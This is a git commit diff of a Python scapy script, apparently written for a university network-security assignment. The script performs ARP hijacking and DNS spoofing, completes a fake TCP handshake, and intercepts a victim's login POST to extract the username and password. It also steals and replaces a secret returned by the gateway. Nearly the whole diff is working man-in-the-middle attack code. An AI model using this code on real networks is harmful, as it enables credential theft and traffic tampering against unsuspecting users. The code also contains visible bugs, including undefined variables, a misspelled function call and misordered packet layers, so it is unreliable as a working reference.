14413a532f2c825c6bddd20dd606ecaea6428698
gabeh33 <66029105+gabeh33@users.noreply.github.com>
2023-01-31 22:56:38 -0500

    Add files via upload

--- attacker.py
+++ attacker.py
@@ -10,15 +10,19 @@ from scapy.layers.dns import DNSRR
 import random
 import socket
 
-ATTACKER_IP = "172.21.255.245"
 INTERFACE = "eth0"
+
+GATEWAY_IP = None
+GATEWAY_HW = None
+ATTACKER_IP = None
+ATTACKER_MAC = None
+VICTIM_IP = None
+VICTIM_HW = None
 
 class TCPServerState:
     LISTEN = 0,
     SYN_RECIEVED = 1,
     ESTABLISHED = 2,
-    # graceful close
-    FIN_WAIT = 3
 
 http_server_state = TCPServerState.LISTEN
 
@@ -31,89 +35,116 @@ def arp_main(src_hw_addr: str, target_hw_addr: str, gw_hw_addr: str, target_ip_a
 
 def on_dns_packet(p: Packet) -> None:
     logging.info(f"forwarding DNS request")
-    # print(p[DNS])
-    #if p[DNS].qr == 1:
 
+    # Our environment is only allowing us to access IPv6 packets, if we filter those out we do not get any packets 
+    # Victim is trying to contact DNS server (qr = 0)
     if p[DNS].qr == 0:
-        #print("packet received: ")
-        #p.show()
-        print("sending packet: ")
-        response = IPv6(src=p[IPv6].dst, dst = p[IPv6].src) / UDP(sport=p[UDP].dport, dport=p[UDP].sport) / Ether(src=p[Ether].dst, dst=p[Ether].src) / DNS(qr=1, aa=1,id=p[DNS].id, an=DNSRR(rdata=(ATTACKER_IP)))
-        #response.show()
+        # Our response to victim, giving our IP as the IP of the class server 
+        # Flip the src/dst for IP and UDP, supply the dst hardware address through Ether
+        # DNS response is our IP
+        response = IPv6(src=p[IPv6].dst, dst = p[IPv6].src) / UDP(sport=p[UDP].dport, dport=p[UDP].sport) / Ether(dst=p[Ether].src) / DNS(qr=1, aa=1,id=p[DNS].id, an=DNSRR(rdata=(ATTACKER_IP)))
         sendp(response, iface=INTERFACE)
+        
+        # Send message to gateway acting as victim
+        # src and dst are the same as the packet received 
+        gateway_msg = IPv6(src=p[IPv6].src, dst = p[IPv6].dst) / UDP(sport=p[UDP].sport, dport=p[UDP].dport) / Ether(dst=p[Ether].dst) / DNS(qr=1, aa=1,id=p[DNS].id, an=DNSRR(rdata=("class.diverge.dev")))
+        sendp(gateway_msg, iface=INTERFACE)
+
 
 def on_http_packet(p: Packet) -> None:
     global http_server_state
     assert IP in p
     assert TCP in p
     assert p[TCP].dport == 1200
-    #print("received packet:")
-    #print(p.show())
+
+    # If the attacker is listening for a SYN packet
     if http_server_state == TCPServerState.LISTEN: # Listening 
         if p[TCP].flags == 'S':
-            # send back SYN-ACK
+
             # ACK sequence + 1, pick random ISN
-            print("packet received:")
-            print(p.show())
-            #r = #(Ether(src=p[Ether].dst, dst=p[Ether].src) 
-            #r = IP(dst=p[IP].src, src=p[IP].dst)/TCP(flags='SA', dport=p[TCP].sport, sport=1200, ack=p[TCP].seq + 1, seq=random.randrange(1000,2000))
-            seq_num = int(p[TCP].seq)
-            r = (Ether(dst=p[Ether].src, src=p[Ether].dst)/(IP(dst=p[IP].src, src=p[IP].dst)/TCP(dport=p[TCP].sport, sport=p[TCP].dport, flags='SA', seq=random.randrange(0,(2**32) - 1), ack=seq_num+1)))
-            print("sending packet:")
-            print(r.show())
-            #s = socket.create_connection((p[IP].src, p[TCP].sport))
-            #s.sendall(r)
-            #s.close()
-            sendp(r, INTERFACE)
-            #http_server_state = TCPServerState.SYN_RECIEVED
+            # Send back a SYN/ACK packet with a new random ISN (32 bit) and ack which is the prev sequence + 1
+            r = (Ether(dst=p[Ether].src, src=p[Ether].dst)/(IP(dst=p[IP].src, src=p[IP].dst)/TCP(dport=p[TCP].sport, sport=p[TCP].dport, flags='SA', seq=random.randrange(0,(2**32) - 1), ack=p[TCP].seq +1)))
+            sendp(r, iface=INTERFACE)
+
+            # Listen for ACK packet back
+            http_server_state = TCPServerState.SYN_RECIEVED
             pass
-        elif p[TCP].flags == 'R':
-            print("received a RST packet")
-        elif p[TCP].flags == 'A':
-            print("received an ACK packet!!!")
 
     elif http_server_state == TCPServerState.SYN_RECIEVED:
-        #print(p.show())
-        # recv ACK
+        # received ACK, TCP Handshake successful
         if p[TCP].flags == 'A':
-            print("received an ACK")
-            print(p.show())
             http_server_state = TCPServerState.ESTABLISHED
-        else:
-            print("failed")
-    pass
 
+    elif http_server_state == TCPServerState.ESTABLISHED:
+        # Recevied a PSH
+        
+        username = None
+        password = None
+
+        if p[TCP].flags == 'PA' and p[IP].src == VICTIM_IP:
+            # Forward unaltered POST request to the gateway 
+
+            p[Ether].dst = GW_HW
+            p[IP].dst = GW_IP
+            sendp(p, iface=INTERFACE)
+            
+            # Intercepting victim -> gateway interaction, where the victim supplies their username and password
+            payload = p[TCP].payload
+            user_pass = payload.split("&")
+            username = user_pass[0].split("=")[1]
+            password = user_pass[1].split("=")[1]
+
+        elif p[TCP].flags == 'PA' and p[IP].src == GATEWAY_IP:
+            # Receive a packet from the gateway, steal/modify the secret, send it to the victim 
+            payload = p[TCP].payload
+            secret = payload.split("=")[1]
+            
+            p[TCP].payload = "secret=holmes.ga@northeastern.edu" 
+            p[TCP].src = ATTACKER_IP
+            p[TCP].dst = VICTIM_IP
+            sendp(p, iface=INTERFACE)
+
+            if username is not None and password is not None:
+                output = {"id": "holmes.ga@northeastern.edu",
+                        "username":username,
+                        "password":password,
+                        "secret":secret
+                        }
+                print(output)
+             
 def on_packet(p: Packet) -> None:
-    #if IP in p:
-     #   print("getting IPv4 packet")
-    #elif IPv6 in p:
-     #   print("getting IPv6 packet")
     if TCP in p and p[TCP].dport == 1200:
-        print("getting http packet")
         on_http_packet(p)
     if UDP in p and DNS in p:
-        print("getting dns packet")
-        on_dns_packet(p)
+        on_dns_iacket(p)
 
 
 def main() -> None:
-    #src_hw_addr = sys.argv[1]
-    #target_hw_addr = sys.argv[2]
-    #gw_hw_addr = sys.argv[3]
-    #target_ip_addr = sys.argv[4]
-    #gw_ip_addr = sys.argv[5]
+    global ATTACKER_HW
+    global VICTIM_HW
+    global GATEWAY_HW
+    global ATTACKER_IP
+    global VICTIM_IP
+    global GATEWAY_IP
 
-    #coloredlogs.install(level="INFO")
+    ATTACKER_HW = sys.argv[1]
+    VICTIM_HW = sys.argv[2]
+    GATEWAY_HW = sys.argv[3]
+    ATTACKER_IP = sys.argv[4]
+    VICTIM_IP = sys.argv[5]
+    GATEWAY_IP = sys.argv[6]
+    
 
-    #logging.info(f"starting ARP hijacker on {INTERFACE}")
-    #p = Process(target=arp_main, args=(src_hw_addr, target_hw_addr, gw_hw_addr, target_ip_addr, gw_ip_addr))
-    #p.start()
+    coloredlogs.install(level="INFO")
+
+    logging.info(f"starting ARP hijacker on {INTERFACE}")
+    p = Process(target=arp_main, args=(src_hw_addr, target_hw_addr, gw_hw_addr, target_ip_addr, gw_ip_addr))
+    p.start()
 
     logging.info(f"starting sniffer on {INTERFACE}")
-    #sniff(prn=lambda p: on_packet(p), quiet-True, filter=PACKET_FILTER, iface=INTERFACE, store=False)
     sniff(store=False, iface=INTERFACE, prn=on_packet)
 
-    #p.join()
+    p.join()
 
 
 if __name__ == "__main__":
